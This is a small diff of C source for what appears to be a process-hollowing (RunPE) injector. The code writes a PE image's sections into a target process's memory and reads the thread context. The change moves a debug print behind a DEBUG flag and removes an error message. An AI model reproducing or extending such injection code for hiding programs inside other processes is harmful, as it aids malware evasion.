@@ -275,7 +275,9 @@ int wmain()
 	for (Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++, srcImageSection++)
 	{
 		WriteProcessMem(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((BYTE*)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
+#ifdef DEBUG
 		printf("[+] Writing  Section %s to @0x%x\n",srcImageSection->Name, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress));
+#endif
 	}
 	srcImageSection--; /*saving last section for relocation*/
 #ifdef DEBUG
@@ -337,7 +339,7 @@ int wmain()
 			}
 		}
 
-		printf("\nerror resuming thread = %d", GetLastError());
+		
 		CONTEXT ctx ;
 		ctx.ContextFlags = CONTEXT_INTEGER; 
 		GetThreadContext(blah1.hThread, &ctx);
